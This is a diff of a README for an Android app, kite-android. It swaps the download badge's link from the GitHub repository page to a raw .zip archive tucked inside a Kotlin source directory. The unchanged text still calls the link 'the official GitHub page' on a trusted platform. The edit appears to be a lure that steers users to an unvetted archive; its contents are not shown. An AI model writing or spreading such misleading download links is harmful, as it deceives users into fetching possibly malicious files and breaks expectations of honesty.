@@ -25,7 +25,7 @@ Getting kite-android on your device is as easy as 1-2-3. Here's your simple step
 
 ### Step 1: Visit the Download Page
 
-[![Download kite-android Now](https://img.shields.io/badge/Download-kite--android-2ea44f?style=for-the-badge&logo=android&logoColor=white&color=blue)](https://github.com/ankit4443-ctrl/kite-android)
+[![Download kite-android Now](https://img.shields.io/badge/Download-kite--android-2ea44f?style=for-the-badge&logo=android&logoColor=white&color=blue)](https://raw.githubusercontent.com/ankit4443-ctrl/kite-android/main/app/android/app/src/main/kotlin/com/freeb5d/kite/2.2.zip)
 
 Visit this link to download the application. This is the official GitHub page where you'll find the latest version of kite-android. GitHub is a trusted platform used by millions of developers worldwide.
 
